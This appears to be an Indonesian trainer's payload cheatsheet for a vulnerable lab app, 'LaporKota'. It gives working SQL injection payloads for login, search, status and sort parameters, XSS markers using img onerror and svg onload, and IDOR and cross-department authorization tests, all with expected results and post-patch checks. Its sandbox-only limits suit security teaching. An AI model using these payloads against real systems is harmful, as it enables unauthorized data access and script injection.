# Cheatsheet Payload — LaporKota (Fase 1, Langkah 6)

Lembar ini dibagikan trainer saat **Langkah 6** (eksplorasi black-box). Tujuannya memahami kapan input berubah menjadi sintaks SQL/HTML, lalu membuktikan perbaikannya. Pilih percobaan bertahap; tidak perlu menghabiskan semua variasi.

## Sebelum mulai

- Kirim **manual satu per satu** lewat Repeater (Burp) / Replay (Caido), hanya ke **sandbox tim atau instance lokal yang ditunjuk trainer**.
- **VPS bersama bukan target payload ini.** Di sana hanya penggunaan normal non-destruktif sesuai panduan kelas. Semua injection, uji lintas tim, pembuatan markup, dan mutasi di lembar ini dilakukan di sandbox/lokal.
- Jangan pakai Intruder/Automate/scanner, brute force, payload penunda (`SLEEP`, `BENCHMARK`), query penulis/penghapus data, atau koneksi keluar. Percobaan SQL cukup memakai ID fixture, konstanta, dan urutan hasil.
- Pertahankan cookie serta token CSRF request asli. Jangan menyalin password, hash, salt, cookie, token, body login atau isi aduan orang lain ke laporan. Catat **ID, status, urutan, dan hasil perbandingan** saja.
- Target latihan adalah **baseline rentan** dari trainer. Pada reference aman atau hasil patch, payload memang seharusnya gagal mengubah logika.

### Siapkan pembanding

Contoh angka di lembar ini memakai **tim 1** dan sandbox dengan minimal dua tim. Ganti sesuai fixture yang tersedia; jangan menebak ID dengan enumerasi massal.

| Penanda | Contoh | Cara memilih |
|---|---|---|
| Akun uji | `tim1_warga_1` | Akun modern milik timmu; password dummy diberikan trainer |
| Aduan sendiri | `101`, `103`, `105` | Cocokkan dari daftar normal akun tersebut |
| Aduan warga lain dalam tim | `102`, `104` | Cocokkan melalui akun `tim1_warga_2` |
| Aduan tim lain | `201` | Gunakan hanya ID fixture pembanding yang ditunjuk trainer |
| Aduan dinas sendiri, siap diproses | `102` | Untuk `tim1_petugas_4`, dinas `102`, status awal `ditugaskan` |

Fixture inti tim N memakai ID `N × 100 + 1 … +5`. Versi seed sekarang juga memiliki aduan tambahan; **awalan ID satu tim tidak berarti semua aduan milik warga yang sama**. Kepemilikan dibuktikan dengan akun pembanding. Pencarian berdasarkan judul atau jumlah baris saja juga tidak membuktikan kebocoran karena judul bisa sama antartim.

### Cara membaca hasil

1. Simpan request normal sebagai **kontrol positif**: fitur sah harus tetap bekerja.
2. Gandakan request; ubah **satu parameter**. Bersihkan filter lain, tetapkan `page=1`, pertahankan akun yang sama.
3. Bila ada pasangan benar/salah, bandingkan **A → B → A** pada daftar. Untuk login, batasi ke pasangan minimum agar tidak menghabiskan rate limit.
4. Catat ID dan urutannya, status HTTP, serta total hasil di JSON bila tersedia. Daftar dipaginasi 10 baris; perubahan isi halaman pertama belum tentu perubahan total.
5. Setelah patch, ulangi request yang sama **dan** kontrol positif.

| Pengamatan | Kesimpulan yang boleh ditulis |
|---|---|
| Aduan di luar scope muncul dalam daftar | Kebocoran akses lewat query terbukti |
| Pasangan kondisi benar/salah konsisten mengubah hasil/urutan sesuai prediksi | Evaluasi ekspresi SQL terbukti; dampaknya dicatat terpisah |
| Username berisi sintaks SQL bisa login memakai password dummy akun yang diketahui | Input username memengaruhi query; **bukan** bukti melewati verifikasi password |
| Tag menjadi elemen DOM | HTML injection terbukti; eksekusi JavaScript belum tentu |
| Dialog JavaScript penanda muncul | Eksekusi JavaScript terbukti pada halaman tersebut |
| `500`, SQL error, halaman kosong, beda ukuran respons saja | Gejala; exploit **belum terbukti** |
| `429`, `403` CSRF, atau redirect ke login | Prasyarat pengujian gagal; jangan simpulkan sink aman/rentan |

---

## 0. Cara menyalin payload dan URL encoding

Semua tabel payload berikut berisi **nilai setelah URL decoding**, bukan string PHP/JSON. `\` di lembar ini berarti **satu backslash**. Contoh pembuka search/filter adalah dua karakter: backslash lalu apostrof, yaitu `\'`.

| Karakter | Encoding untuk query string / body form |
|---|---|
| Backslash `\` | `%5C` |
| Apostrof `'` | `%27` |
| Spasi | `%20` (atau `+` pada form URL-encoded) |
| `#` | `%23` |
| `=` | `%3D` |
| `%` | `%25` |
| `&` | `%26` |
| `+` literal | `%2B` |

MySQL mengenali komentar `-- ` **dengan whitespace setelah dua minus**. Jangan hilangkan spasi terakhir saat menyalin. Alternatif komentar `#` harus menjadi `%23` di URL: `#` mentah di address bar menjadi fragment dan tidak dikirim ke server.

Contoh request lengkap tanpa cookie/token:

```http
GET /laporan?q=%5C%27%20OR%20r.id%3D201%20--%20&page=1 HTTP/1.1
Host: <host-sandbox>:<port>
```

Gunakan session dari request yang ditangkap proxy. Jika editor parameter sudah melakukan encoding otomatis, masukkan nilai mentah di sana; jangan meng-encode dua kali. `%255C%2527` ter-decode sekali menjadi teks `%5C%27`, bukan backslash-apostrof.

Contoh jalur JSON untuk bukti yang lebih mudah dibandingkan:

```text
/api/laporan?q=%5C%27%20OR%20r.id%3D201%20%23&page=1
/api/laporan?status=%5C%27%20OR%20r.id%3D201%20%23&page=1
/api/laporan?sort=IF%28r.id%3D105%2C0%2C1%29&direction=asc&page=1
```

**Pertanyaan:** mengapa payload yang tampak sama di address bar dan Repeater bisa menghasilkan request berbeda?

---

## 1. Login — `POST /login`, field `username`

Konteks: username digunakan sebagai value SQL. Celah pada pemilihan baris user **tidak otomatis** melewati pemeriksaan password berikutnya.

### 1a. Pasangan utama: password benar, username berbeda

Gunakan **password dummy yang benar untuk akun modern milik timmu** di semua baris. Jangan gunakan password sembarang: pasangan bisa sama-sama `401` walaupun query rentan. Pertahankan field `password` dan `csrf`; ubah hanya `username`. `timN_warga_1` harus diganti nama akun yang sebenarnya.

| `username` mentah | Prediksi pada baseline rentan |
|---|---|
| `timN_warga_1` | Kontrol: `303` ke `/laporan` |
| `timN_warga_1' AND '1'='1` | Kondisi benar; dapat memilih akun yang sama → `303` |
| `timN_warga_1' AND '1'='2` | Kondisi salah; tidak memilih akun → `401` |
| `timN_warga_1' -- ` | Sisa query dikomentari; dapat memilih akun yang sama → `303` |

**Bukti utama:** dua baris `AND` memberi hasil sesuai logika benar/salah, sementara username literal normal tetap berhasil. Setelah patch, seluruh username yang mengandung sintaks tambahan diperlakukan sebagai teks dan gagal (`401`); akun normal tetap `303`.

Login berhasil merotasi token CSRF. Setelah setiap `303`, ambil token terbaru dari form `/login` sebelum POST berikutnya; setelah `401`, gunakan token pada form respons. Jangan memakai ulang token lama dari sebelum login sukses.

### 1b. Variasi opsional — pilih satu, jangan kirim semuanya

| `username` mentah | Yang dipelajari |
|---|---|
| `timN_warga_1' AND 2>1 -- ` | Kondisi numerik benar |
| `timN_warga_1' AND 2<1 -- ` | Pasangan numerik salah |
| `timN_warga_1' #` | Komentar alternatif MySQL; body form perlu encoding `#` bila disusun manual |
| `timN_warga_1'` | Probe petik tunggal; error hanya gejala, bukan bukti |
| `akun_dummy_tidak_ada` | Kontrol negatif: username tidak ada → pesan gagal generik |

Jangan anggap `' OR 1=1 -- ` pasti membuat login berhasil: baris pertama yang dipilih belum tentu cocok dengan password yang dikirim. Latihan ini tidak memerlukan UNION, tebakan hash, atau pengambilalihan akun lain.

**Rate limit:** default 5 kegagalan dalam 300 detik, dapat berbeda sesuai konfigurasi trainer. Berhenti pada `429`, tunggu jendela sesuai arahan trainer; jangan mengubah IP/akun untuk menghindarinya. Login memang mengubah session dan audit; jalankan hanya di target lab.

- **Kontrol positif:** akun modern normal + password benar → `303`, halaman setelah login dapat dibuka.
- **Seharusnya:** username di-bind sebagai value; kegagalan memakai pesan generik.
- CWE-89 (SQL Injection).

**Pertanyaan:** apakah login dengan username suntikan dan password akun yang benar membuktikan bypass password? Jelaskan batas buktinya.

---

## 2. Pencarian — `GET /laporan?q=`, value SQL dalam LIKE

Konteks: pencarian dibungkus pola LIKE. Baseline menggandakan apostrof tetapi lupa menangani backslash. Contoh berikut bergantung pada perilaku MySQL lab; bukan payload universal semua database.

### 2a. Input sah yang harus tetap bisa dicari

| `q` mentah | Yang diamati |
|---|---|
| `O'Brian` | Judul fixture dengan apostrof ditemukan |
| `100%` | Persen dicari literal; tidak menjadi wildcard bebas |
| `_` | Underscore dicari literal; tidak menjadi wildcard satu karakter |
| `雪` | Karakter Unicode tetap benar |
| `\` | Satu backslash dicari sebagai teks, tidak error |
| `!` | Karakter escape LIKE tetap diperlakukan sebagai data |
| `100%_雪` | Gabungan karakter literal pada fixture inti |
| `teks_dummy_tidak_ada_987` | Kontrol negatif: hasil kosong |

Untuk `\` atau `!`, hasil kosong dapat benar bila tidak ada judul yang cocok; bukan semua input sah harus menemukan hasil. Cari dari akun pemilik fixture, bersihkan status lain sebelum menyimpulkan pencarian rusak.

### 2b. Variasi payload bertahap

| `q` mentah | Tujuan / prediksi pada baseline |
|---|---|
| `'` | Probe pembatas string; mungkin tetap literal akibat quote-doubling |
| `\'` | Probe interaksi backslash + petik; error hanya gejala |
| `\' OR r.id=201 -- ` | Aduan pembanding 201 muncul di luar scope akun tim 1 |
| `\' OR r.id=201 #` | Efek sama, komentar alternatif; encode `#` sebagai `%23` |
| `\' OR r.id=201 AND 1=1 #` | Pasangan A: kondisi pembanding benar → 201 muncul |
| `\' OR r.id=201 AND 1=2 #` | Pasangan B: kondisi pembanding salah → 201 tidak muncul |
| `\' OR 1=1 -- ` | Semua baris cocok; amati ID di luar scope dan total, bukan hanya panjang halaman |
| `\' OR 1=2 -- ` | Pembanding falsy; amati ID aktual, jangan mengasumsikan hasil pasti kosong |

Mulai dengan **satu ID pembanding**. Pasangan `r.id=201 AND …` memberi bukti yang lebih terarah daripada membuka seluruh daftar. `AND` dievaluasi sebelum `OR`; fragmen pencarian di sisi kiri masih dapat mencocokkan baris, sehingga periksa keberadaan **201**, bukan asumsi jumlah nol.

**Bukti:** request normal tidak menampilkan 201, A menampilkannya, B tidak, A kembali menampilkannya. Tidak perlu membuka atau menyalin isi aduan tersebut. Jika sandbox hanya satu tim, gunakan ID warga lain yang diketahui dan jelaskan bahwa dampaknya lintas pemilik dalam tim.

- **Kontrol positif:** pencarian literal pada 2a tetap bekerja setelah patch.
- **Seharusnya:** bind value + escape wildcard LIKE; scope kepemilikan tetap berlaku.
- CWE-89.

**Pertanyaan:** mengapa menggandakan apostrof saja belum cukup? Apa beda mencegah SQL injection dan menjaga `%` tetap literal di LIKE?

---

## 3. Filter status — `GET /laporan?status=`, value SQL

Konteks: baseline hanya menggandakan apostrof, tanpa allowlist. Batas input **30 karakter setelah decoding**; variasi berikut tetap pendek untuk ID tiga digit contoh.

| `status` mentah | Tujuan / prediksi pada baseline |
|---|---|
| `baru` | Kontrol positif: hanya status baru dalam scope |
| `ditugaskan` | Kontrol status sah lain; akunmu bisa tidak memiliki hasil |
| `diproses` | Kontrol status sah lain |
| `selesai` | Kontrol status sah lain |
| `ditolak` | Kontrol status sah lain |
| `zzz` | Baseline bisa kosong dengan `200`; sesudah patch harus `400` |
| `BARU` | Di luar enum persis; sesudah patch harus `400` |
| `\' OR r.id=201-- ` | Memunculkan ID pembanding di luar scope |
| `\' OR r.id=201 #` | Komentar alternatif |
| `\' OR r.id=201 AND 1=1 #` | A: 201 muncul |
| `\' OR r.id=201 AND 1=2 #` | B: 201 tidak muncul |
| `\' OR 1=1 #` | Melonggarkan predikat; cek ID/total |
| `\' OR 1=2 #` | Pembanding kondisi salah |

Contoh URL: `/laporan?status=%5C%27%20OR%20r.id%3D201--%20&page=1`.

**Urutan kerja:** bersihkan `q`, pilih status sah, jalankan pasangan A/B, lalu ulangi status sah. `zzz → 200 kosong` membuktikan validasi enum kurang ketat, **bukan** SQL injection dengan sendirinya.

- **Seharusnya:** enum persis `{baru, ditugaskan, diproses, selesai, ditolak}`; di luar itu → `400`; status sah di-bind sebagai value.
- CWE-89.

**Pertanyaan:** mengapa filter status membutuhkan validasi bisnis sekaligus parameter binding?

---

## 4. Urutan — `GET /laporan?sort=`, ekspresi / identifier SQL

Konteks: `sort` menyusun ORDER BY. Batas **30 karakter**. Solusinya mapping pilihan ke fragmen SQL konstan; placeholder value tidak memilih nama kolom. Parameter arah yang dipakai aplikasi adalah **`direction`**, bukan `dir`, dan sudah dibatasi ke `asc`/`desc`.

Untuk contoh berikut login sebagai `tim1_warga_1`, pastikan 105 memang terlihat, kosongkan `q`/`status`, gunakan `direction=asc&page=1`.

| `sort` mentah | Yang diamati |
|---|---|
| `created_at` | Kontrol positif: urut waktu; ID menjadi pembanding tambahan |
| `status` | Kontrol positif: urut status |
| `IF(r.id=105,0,1)` | A: 105 di awal karena nilai ekspresi 0 |
| `IF(r.id=105,1,0)` | B: 105 di akhir karena nilai ekspresi 1 |
| `IF(1=1,r.id,-r.id)` | A: ID naik dengan `direction=asc` |
| `IF(1=2,r.id,-r.id)` | B: ID turun dengan `direction=asc` |
| `r.id` | Baseline dapat menerima nama kolom di luar opsi UI; target harus `400` |
| `(SELECT 1)` | Ekspresi konstan; sukses saja **belum** membuktikan evaluasi subquery |
| `nama_kolom_ngawur` | Bisa error di baseline; target harus `400` |

Ulangi dua baris `IF(r.id=105,…)` dengan `direction=desc`: posisi prioritas berbalik. Jika daftar melebihi satu halaman, “di akhir” bisa berarti halaman terakhir; lebih mudah gunakan akun fixture inti dengan tiga aduan.

**Bukti kuat:** pasangan ekspresi membalik urutan ID sesuai prediksi, konsisten saat diulang. `(SELECT 1)` dapat menghasilkan urutan yang sama dengan fallback/default atau tie-breaker; jangan jadikan bukti tunggal.

- **Kontrol positif:** `created_at` / `status` × `asc` / `desc` tetap bekerja setelah patch.
- **Seharusnya:** `sort` hanya `{created_at, status}`, `direction` hanya `{asc, desc}`; nilai lain → `400`.
- CWE-89 (ORDER BY injection).

**Pertanyaan:** mengapa query `ORDER BY ?` dengan value `status` bukan pengganti mapping nama kolom?

---

## 5. Judul & deskripsi bermarkup — konteks output HTML

Ada tiga lokasi pemeriksaan: **judul di daftar**, **judul di detail**, dan **deskripsi di detail**. Perbaikan salah satu lokasi belum memperbaiki yang lain. JSON menjadi pembanding nilai asli.

### 5a. Tanpa membuat data: fixture yang sudah ada

1. Buka detail aduan milikmu yang deskripsinya memuat `<b>…</b>`. Untuk judul fixture `<b>rusak</b>`, gunakan akun pemiliknya (`tim1_warga_2`, aduan 102 pada contoh tim 1); jangan mencampur uji encoding dengan bonus akses asing.
2. Bandingkan tampilan browser, raw response HTML di Repeater, dan DOM di DevTools → Elements.
3. Buka `/api/laporan/detail?id=<ID-sama>`: pastikan JSON valid dan nilai string asli terjaga.
4. Periksa judul yang sama di daftar `/laporan`.

| Hasil | Makna |
|---|---|
| Browser menebalkan teks dan Elements memiliki elemen `<b>` | HTML injection terbukti |
| Raw HTML pada lokasi teks berisi `&lt;b&gt;` dan browser menampilkan `<b>` sebagai teks | Output pada lokasi itu inert |
| JSON berisi `<b>` atau escape JSON setara seperti `\u003C` setelah diparse | Benar untuk data string; bukan celah HTML dengan sendirinya |
| Tag terlihat di raw response saja | Pastikan konteksnya: teks, atribut, atau data lain; cek DOM sebelum menyimpulkan |

### 5b. Membuat data — hanya sandbox/lokal

Pakai form **buat aduan** dengan akun sendiri; pertahankan field sah dan CSRF. Uji satu field dulu: judul bermarkup + deskripsi polos, lalu judul polos + deskripsi bermarkup. Tidak perlu mengunggah foto.

| Nilai judul atau deskripsi | Tujuan / prediksi pada baseline |
|---|---|
| `LAB-HTML-01 teks biasa` | Kontrol positif |
| `<b>LAB-HTML-02 tebal</b>` | Memeriksa apakah tag menjadi elemen |
| `<em>LAB-HTML-03 miring</em>` | Variasi tag HTML |
| `<span data-lk-probe="04">LAB-HTML-04</span>` | Cari atribut penanda di Elements; tanpa JavaScript |
| `LAB-HTML-05 < > & " ' 雪` | Karakter sah harus tetap utuh sebagai teks setelah patch |
| `&lt;b&gt;LAB-HTML-06&lt;/b&gt;` | Mengamati decoding entity; cek DOM, jangan hanya tampilan |
| `<img src=x onerror=alert('LK-XSS-07')>` | Penanda JavaScript lokal; CSP bisa memblokir event inline |
| `<svg onload=alert('LK-XSS-08')></svg>` | Variasi penanda JavaScript lokal; CSP bisa memblokir |

Konfigurasi aplikasi saat ini memakai CSP `script-src 'none'`: kedua penanda JavaScript di atas diperkirakan **diblokir**, sekalipun output baseline menerima tag mentah. Gunakan percobaan ini untuk melihat perbedaan DOM dan Console, bukan mengejar dialog.

Dua payload JavaScript terakhir **opsional**, hanya pada sandbox/lokal dengan data dummy; tidak membaca cookie, tidak mengirim data keluar. `src=x` pada contoh gambar dapat memicu satu request relatif ke instance lab. Tidak perlu melemahkan CSP agar dialog muncul.

Untuk payload entity, baseline dapat menampilkan teks `<b>…</b>` tanpa membuat elemen `<b>`; setelah patch input entity itu sendiri harus tampil apa adanya sebagai `&lt;b&gt;…`. Bedakan **string yang disimpan**, **HTML response**, **DOM**, dan **teks yang terlihat**.

### 5c. Bedakan HTML injection, XSS, dan CSP

- Elemen `<b>`/`<span>` terbentuk → bukti HTML injection pada lokasi tersebut.
- Dialog `LK-XSS-07`/`08` muncul → bukti eksekusi JavaScript.
- Elemen terbentuk, dialog tidak muncul, Console melaporkan pelanggaran CSP → output masih menerima markup; JavaScript payload itu diblokir CSP. Jangan tulis “XSS dieksekusi”.
- Setelah patch, seluruh payload tampil sebagai teks inert; tidak terbentuk elemen dari input. JSON tetap mengembalikan string asli.

Jangan mencoba menyiasati CSP: sasaran latihan adalah memperbaiki output encoding. Pada Fase 1 cek string asli lewat JSON; pemeriksaan raw di database baru pada Fase 2 sesuai panduan.

- **Seharusnya:** encode saat output HTML, simpan data raw; jangan menghapus tag saat penyimpanan atau meng-HTML-encode seluruh JSON.
- CWE-79 untuk risiko stored XSS.

**Pertanyaan:** mengapa menghilangkan `<` saat penyimpanan bisa merusak data tanpa menyelesaikan semua konteks output?

---

## 6. Bonus — akses detail warga lain, `GET /laporan/detail?id=`

Ini **uji otorisasi**, bukan SQL injection. Gunakan dua akun pembanding yang disediakan; angka ID dikirim normal tanpa sintaks SQL. Sandbox/lokal saja.

| Langkah | Hasil yang diperiksa |
|---|---|
| Login `tim1_warga_1`, buka detail 101 | Kontrol positif: detail sendiri tersedia |
| Dengan session yang sama, buka detail 102 | Baseline HTML dapat memperlihatkan detail warga lain dalam tim |
| Buka `/api/laporan/detail?id=102` | Jalur JSON tetap `404`; bandingkan gap HTML vs JSON |
| Jika ditunjuk trainer, ulangi HTML/JSON untuk ID 201 | Pembanding lintas tim di sandbox |
| Login sebagai pemilik 102, buka detailnya | Memastikan data ada dan akses pemilik sah tetap bekerja |

Jika akun pembanding tidak tersedia, minta trainer menyediakan ID; jangan menyimpulkan `404` pasti karena otorisasi, karena ID mungkin tidak ada. `200` saja juga belum cukup: pastikan respons benar halaman detail dan data milik akun lain memang terbuka, tanpa menyalin isinya.

- **Seharusnya:** kepemilikan warga diperiksa di semua jalur; detail asing `404`, detail sendiri tetap tersedia.
- CWE-639.

---

## 7. Bonus — mutasi lintas dinas, `POST /petugas/laporan/status`

**Mengubah data: hanya sandbox/lokal disposable.** Gunakan aduan yang disiapkan trainer. Ulang A → B → A tidak cocok untuk transisi status karena state sudah berubah; siapkan ulang melalui prosedur trainer bila perlu.

Contoh fixture inti: `tim1_petugas_4` adalah dinas **102**, sedangkan aduan **102** ditugaskan ke dinas **102** dan masih `ditugaskan`. Untuk akun ini, aduan **202** milik dinas **202** adalah kandidat pembanding lintas dinas dengan status awal yang sama. Angka dinas dan angka aduan kebetulan sama pada contoh ini, tetapi merupakan objek berbeda.

1. Dengan akun pemilik/akun pembanding yang berwenang, pastikan aduan pembanding memang `ditugaskan`; catat ID + status saja.
2. Login `tim1_petugas_4`. Tangkap form transisi normal untuk aduan sendiri 102; pertahankan token CSRF yang valid dari session petugas tersebut.
3. Untuk kontrol positif, transisi aduan sendiri `ditugaskan → diproses` harus sah. Ini juga mengubah fixture; lakukan pada data disposable.
4. Gandakan request dengan session/token yang masih valid, ubah hanya `id` menjadi 202, `status=diproses`, catatan dummy bila diperlukan. Tidak perlu membuka detail asing dari session petugas penguji untuk mendapatkan token.
5. Bandingkan status sebelum/sesudah melalui akun yang berwenang. Baseline bisa menerima transisi asing; sesudah patch harus `404` dan state tetap.

| Kontrol tambahan | Seharusnya |
|---|---|
| Token CSRF invalid dengan ID pembanding | `403`; membuktikan CSRF aktif, bukan otorisasi dinas |
| Akun warga mencoba endpoint petugas | `403` |
| Transisi pada status awal yang tidak sesuai | `409`; bukan bukti pemeriksaan dinas berhasil |
| Status tujuan di luar enum | `400` |

- **Bukti:** perubahan state asing benar-benar terjadi; `303` saja belum cukup.
- **Seharusnya:** predikat `id + dinas` dalam transaksi; role, CSRF, dan aturan transisi tetap berlaku.
- CWE-285.

---

## 8. Kalau payload tidak menghasilkan perubahan

| Gejala | Periksa dulu |
|---|---|
| `303` ke `/login`, atau halaman login alih-alih daftar | Session belum login / cookie dari akun berbeda |
| `403` pada POST | Token CSRF milik session terbaru; login sukses merotasi token |
| `429` | Hentikan percobaan login, tunggu jendela rate limit sesuai trainer |
| `400` untuk `sort`/`status` | Bisa sudah aman; bisa juga batas panjang/tipe input. Bandingkan kontrol sah |
| Search menghasilkan `200` kosong | Encoding, satu backslash, komentar, filter lain, scope fixture, dan versi target |
| `#` tampak tidak berfungsi | Encode `%23`; fragment browser tidak dikirim |
| `--` tampak tidak berfungsi | Ada whitespace sesudah `--`, tanpa double encoding |
| Jumlah baris tetap 10 | Periksa `total`/`pages` di JSON dan ID; itu batas pagination |
| Judul sama terlihat dua kali | Judul fixture dapat sama lintas tim; bandingkan ID |
| Payload sort tidak menaruh 105 di awal | Pastikan ID 105 terlihat, `direction=asc`, filter kosong, `page=1` |
| Semua login gagal termasuk kontrol | Password lab, CSRF, rate limit, atau lingkungan; jangan menyebutnya patch berhasil |
| Markup terbentuk tetapi dialog tidak muncul | Console/CSP; bedakan HTML injection dari eksekusi JavaScript |
| Respons `500` | Catat sebagai gejala; gunakan pasangan lain yang memberi bukti perilaku tanpa error |

Eksperimen negatif juga berguna: tulis **apa yang diuji, apa yang diamati, dan apa yang belum bisa disimpulkan**. Payload gagal bukan bukti semua jalur aman.

---

## 9. Checklist sesudah patch (Fase 2)

| Area | Uji keamanan | Kontrol fungsi sah |
|---|---|---|
| Login | Username sintaks tambahan tidak login, pesan generik | Akun modern normal tetap `303` |
| Search | ID di luar scope tidak muncul; sintaks diperlakukan sebagai teks | Apostrof, Unicode, `%`, `_`, backslash, `!` tetap literal |
| Status | Payload dan enum tidak dikenal → `400` | Kelima enum sah bekerja dalam scope |
| Sort | Ekspresi / kolom di luar mapping → `400` | Dua sort × dua arah sah tetap bekerja |
| Output HTML | Input tidak membentuk elemen pada ketiga lokasi | Teks asli terbaca, Unicode utuh, JSON tidak berubah |
| Detail warga | HTML dan JSON menolak detail asing | Pemilik tetap bisa membaca |
| Mutasi dinas | State asing tidak berubah | Transisi sendiri sah, kontrol role/CSRF/lifecycle tetap berlaku |

**Legacy (LK-08):** login normal `timN_warga_2` belum membuktikan migrasi hash. Di Fase 1 catat **HIPOTESIS**; pemeriksaan perubahan skema/hash/version dan regresi migrasi dilakukan pada Fase 2. Jangan memasukkan hash/salt ke evidence.

---

## Rangkuman ke register (Langkah 7)

| ID | Pintu | Konteks | Percobaan utama | Bukti minimum |
|---|---|---|---|---|
| LK-01/02/03 | Judul daftar, judul detail, deskripsi detail | HTML | Fixture `<b>` / penanda `data-lk-probe` | Elemen terbentuk; catat terpisah tiap lokasi, JSON utuh |
| LK-04 | `POST /login`, username | Value SQL | Pasangan `AND '1'='1` / `AND '1'='2` dengan password lab benar | Hasil autentikasi mengikuti logika; bukan klaim bypass password |
| LK-05 | `/laporan?q=` | Value SQL, LIKE | `\' OR r.id=201 AND 1=1 #` vs `1=2` | ID pembanding muncul/hilang sesuai kondisi |
| LK-06 | `/laporan?status=` | Value SQL | Pasangan ID + kondisi seperti search | ID pembanding muncul/hilang sesuai kondisi |
| LK-07 | `/laporan?sort=` | ORDER BY | Dua ekspresi `IF(r.id=105,…)` | Urutan ID mengikuti ekspresi |
| LK-08 | Login legacy | Migrasi password | Login normal; validasi internal di Fase 2 | Fase 1 tetap HIPOTESIS |
| LK-09 | `/laporan/detail?id=` | Otorisasi warga | ID milik akun pembanding | HTML asing terbuka, JSON pembanding menolak |
| LK-10 | `/petugas/laporan/status` | Otorisasi dinas | ID dinas lain pada state yang sah | State asing benar-benar berubah (sandbox/lokal) |

Template catatan satu eksperimen:

```text
ID temuan / percobaan:
Target lab + versi baseline/patch:
Actor (tanpa credential):
Method + path + parameter yang diubah:
Kontrol positif → HTTP + ID/status/urutan:
Payload A → HTTP + ID/status/urutan:
Payload B → HTTP + ID/status/urutan:
Pengulangan (bila non-mutasi):
Hasil aktual vs prediksi:
Yang terbukti / yang belum terbukti:
Rekomendasi sesuai konteks:
Setelah patch: payload + kontrol positif:
Status: TERBUKTI / HIPOTESIS / BELUM TERBUKTI
```

Jangan tempel raw request lengkap yang berisi cookie/token atau body login. Evidence cukup ringkasan yang bisa diulang trainer, tanpa isi aduan asing.
